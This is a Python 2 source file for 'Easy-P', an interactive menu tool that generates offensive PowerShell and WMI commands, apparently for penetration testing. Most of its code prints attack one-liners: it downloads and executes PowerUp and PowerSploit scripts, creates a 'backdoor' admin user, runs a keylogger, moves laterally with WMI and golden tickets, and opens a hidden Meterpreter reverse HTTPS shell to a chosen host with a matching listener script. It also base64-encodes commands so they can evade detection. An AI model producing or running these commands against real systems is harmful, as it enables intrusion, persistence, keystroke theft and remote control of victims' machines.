#Powershell/WMI Generator aka Easy-P
#By Peter Kim
#Secure Planet LLC

import base64
import sys
import re
import os
import getopt
import subprocess as sp

print "___________                              __________ "
print "\_   _____/____    _________.__.         \______    \ "
print "  |    __)_\__  \  /  ___<   |  |  ______  |     ___/"
print "  |        \/ __ \_\___ \ \___  | /_____/  |    |    "
print " /_______  (____  /____  >/ ____|          |____|    "
print "         \/     \/     \/ \/                         "

global run_execute
run_execute = "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('"

print "PowerShell/WMI Generator"
def clear():
	os.system('cls' if os.name == 'nt' else 'clear')
def powershell_encode(data):
	#https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
	#Carlos - aka Darkoperator wrote the code below:
	# blank command will store our fixed unicode variable
	blank_command = ""
	powershell_command = ""
	# Remove weird chars that could have been added by ISE
	n = re.compile(u'(\xef|\xbb|\xbf)')
	# loop through each character and insert null byte
	for char in (n.sub("", data)):
		# insert the nullbyte
		blank_command += char + "\x00"
	# assign powershell command as the new one
	powershell_command = blank_command
	# base64 encode the powershell command
	powershell_command = base64.b64encode(powershell_command)
	return powershell_command

def change_config():
	print ""
def location():
	pass

def priv():
	clear()
	print ("""
	Privilege Escalation:
	1. Search for vulnerable service privilege opportunities
	2. Abuse vulnerable service privilege opportunities
	3. Write-UserAddMSI
	""")
	ans=raw_input("What would you like to do: ") 
	if ans=="1":
		print "[*]Description: Search for vulnerable service privilege opportunities"
		print "[*]Download from internet and execute:"
		print run_execute + "https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
		print "\n[*]Run from a local copy of the script:"
		print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"'
		print "\n[*]Base64 encoded version download and execute:"
		x = powershell_encode(run_execute + "https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks")
		print "powershell.exe -enc " + x
	if ans=="2":
		print "[*]Description: Abuse vulnerable service privilege opportunities"
		ans_service=raw_input("Service Name: ") 
		print "[*]Download from internet and execute:"
		print run_execute + "https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName "+ans_service+" -UserName backdoor -Password password123 -Verbose"
		print "\n[*]Run from a local copy of the script:"
		print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Write-ServiceEXE -ServiceName '+ans_service+' -UserName backdoor -Password password123 -Verbose}"'
		print "\n[*]Base64 encoded version download and execute:"
		x = powershell_encode(run_execute + "https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName  "+ans_service+" -UserName backdoor -Password password123 -Verbose")
		print "powershell.exe -enc " + x
	if ans=="3":
		print "[*]Description: Write-UserAddMSI - If the AlwaysInstallElevated key is enabled for MSI files, Create an MSI to create local admin"
		print "[*]Download from internet and execute:"
		print run_execute + "https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI"
		print "\n[*]Run from a local copy of the script:"
		print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Write-UserAddMSI}"'
		print "\n[*]Base64 encoded version download and execute:"
		x = powershell_encode(run_execute + "https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI")
		print "powershell.exe -enc " + x

def key():
	clear()
	print "Keylogging:"
	print "[*]Description: Keylogger Saving Strokes to C:\Users\Public\key.log"
	print "[*]Download from internet and execute:"
	print run_execute + "https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log"
	print "\n[*]Run from a local copy of the script:"
	print 'powershell.exe -exec bypass -Command "& {Import-Module .\Get-Keystrokes.ps1; Get-Keystrokes -LogPath C:\Users\Public\key.log}"'
	print "\n[*]Base64 encoded version download and execute:"
	x = powershell_encode(run_execute + "IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log")
	print "powershell.exe -enc " + x
	
def lat():
	clear()
	print ("""
	Lateral Movement:
	1. Kerberos Golden Ticket Lateral Movement with WMI
	2. WMI Powershell Execution
	""")
	ans=raw_input("What would you like to do: ") 
	if ans=="1":
		print 'wmic /authority:"Kerberos:[DOMAIN]\[HOSTNAME]" /node:[HOSTNAME] process call create "cmd /c [Command]"'
		print 'Example: wmic /authority:"Kerberos:hacker.testlab\win8" /node:win8 process call create "cmd /c ping 127.0.0.1 > C:\log.txt"'
	elif ans=="2":
		print 'Powershell.exe Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "powershell.exe -enc [Base64 encoded string]" -ComputerName [victim IP] -Credential [Username]'
		
def metasploit():
	clear()
	print "[*]PowerShell Metasploit Meterpreter Reverse HTTPS Shell"
	ans_lhost=raw_input("LHOST: ") 
	ans_lport=raw_input("LPORT: ") 
	print "[*]Download from internet and execute:"
	print "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force"
	print "\n[*]Run from a local copy of the script:"
	print 'powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-Shellcode.ps1; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost '+ans_lhost+' -Lport '+ans_lport+' -Force}"'
	print "\n[*]Base64 encoded version download and execute:"
	x = powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force")
	print "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + x
	print "\n[*]Listner Resource Script (listener.rc) - Save the following to a file called listener.rc on your Kali box and load your handler with msfconsole -r listener.rc"
	print "use multi/handler \nset payload windows/meterpreter/reverse_https \nset LHOST " + ans_lhost + "\nset LPORT " + ans_lport + "\nset ExitOnSession false \nexploit -j"

def p101():
	print "Powershell Flags:"
	print "[*] -Exec Bypass : Bypass Security Execution Protection "
	print "[*] -NonI : Noninteractive Mode - PowerShell does not present an interactive prompt to the user "
	print "[*] -NoProfile : PowerShell console not to load the current user's profile"
	print "[*] -W Hidden : Sets the window style for the session"
	print "32bit Powershell Execution: powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
	print "64bit Powershell Execution: %WinDir%\syswow64\windowspowershell\\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
	print 'Permanently change a users execution policy: powershell -exec bypass -noninteractive -w hidden -Command "& {Set-ExecutionPolicy Unrestricted -Scope CurrentUser}"'
	
	
ans=True
while ans:
	print ("""
                        ==Easy-P Menu System==
                        1.Privilege Escalation
                	2.Lateral Movement
                	3.Keylogging
                	4.PowerShell Meterpreter
                	5.Change Users Execution Policy
                	6.Powershell 101
                	7.Base64 Encode a PowerShell Script
                	8.Exit/Quit
    """)
	ans=raw_input("What would you like to do: ") 
	if ans=="1":
		priv()
	elif ans=="2":
		lat()
	elif ans=="3":
		key()
	elif ans=="4":
		metasploit()
	elif ans=="5":
		clear()
		print 'This will permanently change the current users execution policy:'
		print 'powershell -exec bypass -noninteractive -w hidden -Command "& {Set-ExecutionPolicy Unrestricted -Scope CurrentUser}"'
	elif ans=="6":
		p101()
	elif ans=="7":
		code=raw_input("PowerShell Script to Encode:")
		print code 
		print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(code)
	elif ans=="8":
		sys.exit(0)
